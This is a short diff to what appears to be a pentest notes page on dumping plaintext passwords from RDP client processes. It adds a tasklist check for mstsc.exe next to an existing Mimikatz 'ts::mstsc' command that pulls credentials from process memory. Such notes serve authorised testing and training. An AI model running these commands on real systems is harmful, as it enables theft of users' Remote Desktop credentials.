@@ -33,7 +33,8 @@ Dump plain text passwords from RDP server processes.
 Dump plain text passwords from RDP client processes.
 
 === "[[notes/tools/mimikatz]]"
-    ~~~ bat
+    ~~~ powershell
+    tasklist.exe /fi "imagename eq mstsc.exe"
     .\mimikatz.exe privilege::debug ts::mstsc exit
     ~~~
 
